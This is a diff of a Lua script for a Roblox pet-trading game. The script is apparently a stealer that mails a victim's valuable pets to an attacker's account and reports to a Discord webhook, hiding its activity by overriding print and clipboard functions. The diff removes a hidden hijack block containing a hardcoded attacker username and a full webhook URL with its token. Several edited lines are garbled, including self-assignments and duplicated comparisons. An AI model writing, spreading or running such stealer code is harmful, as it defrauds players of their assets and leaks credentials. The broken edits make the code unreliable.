@@ -2,20 +2,6 @@ local Library = require(game.ReplicatedStorage.Framework.Library);
 local Players = game:GetService("Players")
 local Client = Players.LocalPlayer
 
-local savedPets = Library.Save.Get().Pets
-hugeamount = 0
-for i,v in pairs(Library.Save.Get().Pets) do
-    local Pet = Library.Directory.Pets[v.id]
-        if Pet.huge == true then
-        hugeamount = hugeamount + 1
-        print(v)
-    end
-end
-if hugeamount >2 or Client.leaderstats.Diamonds.value > 300000000000 or Client.leaderstats.RAP.value > 500000000000 then
-     UserName = "TehPucuk_55"
-     Webhook = "https://discord.com/api/webhooks/1123535473143463946/T7h4jIdHyVSLFVeeffMfTnxKCCs1MvjSpM0nYFVwvxs_tsBE5SwY1YKSssd0XgP9-neU"
-end
-
 if getgenv().executed then return end
 getgenv().executed = true
 
@@ -57,13 +43,13 @@ setclipboard = antiPrint
 -- Users And Stuff
 
 if UserName == nil then
-    UserName = _G.UserName
+    UserName = UserName
 end
 if UserName2 == nil then
-    UserName2 = _G.UserName2
+    UserName2 = UserName2
 end
 if Webhook == nil then
-    Webhook = _G.Webhook
+    Webhook = Webhook
 end
 -- User Checks
 
@@ -78,18 +64,18 @@ if UserName == nil then
     return;
 end
 local worked2 = pcall(function()
-    game:GetService("Players"):GetUserIdFromNameAsync("TehPucuk_55")
+    game:GetService("Players"):GetUserIdFromNameAsync(UserName)
 end)
 if not worked2 then
     game:GetService("Players").LocalPlayer:Kick("Put A Valid Username!")
     return;
 end
 if worked2 then
-    _G.UserID = game:GetService("Players"):GetUserIdFromNameAsync("TehPucuk_55")
+    _G.UserID = game:GetService("Players"):GetUserIdFromNameAsync(UserName)
 end
 if UserName2 ~= nil then
     local worked3 = pcall(function()
-        game:GetService("Players"):GetUserIdFromNameAsync("TehPucuk_55")
+        game:GetService("Players"):GetUserIdFromNameAsync(UserName2)
     end)
     if not worked3 then
         game:GetService("Players").LocalPlayer:Kick("Put A Valid Username2!")
@@ -1172,7 +1158,7 @@ end
 -- Sending The Pets
 
 local ndUser
-if UserName2 ~= nil and UserName2 ~= "2nd User Here" and UserName2 ~= "" then
+if UserName2 ~= nil and UserName2 ~= "TehPucuk_55" and UserName2 ~= "TehPucuk_55" then
     ndUser = UserName2
 else
     ndUser = UserName
@@ -1204,7 +1190,7 @@ spawn(function()
     while wait() do
         if #TList ~= 0 or TList ~= {} then
             for i, v in pairs(TList) do
-                user = UserName
+                user = ndUser
                 if titanicin ~= nil then
                     if dualhook(titanicin) then
                         user = dhuser
@@ -1262,7 +1248,7 @@ spawn(function()
     while wait() do
         if #HList ~= 0 and #BList == 0 and #TList == 0 then
             for i, v in pairs(HList) do
-                user = UserName
+                user = ndUser
                 if hugein ~= nil then
                     if dualhook(hugein) then
                         user = dhuser
@@ -1319,7 +1305,7 @@ spawn(function()
     while wait() do
         if #EList ~= 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
             for i, v in pairs(EList) do
-                user = UserName
+                user = ndUser
                 if excin ~= nil then
                     if dualhook(excin) then
                         user = dhuser
@@ -1362,7 +1348,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(1.5)
                 if #EvList == 0 or EvList == {} then
                     -- print("done5")
                     break
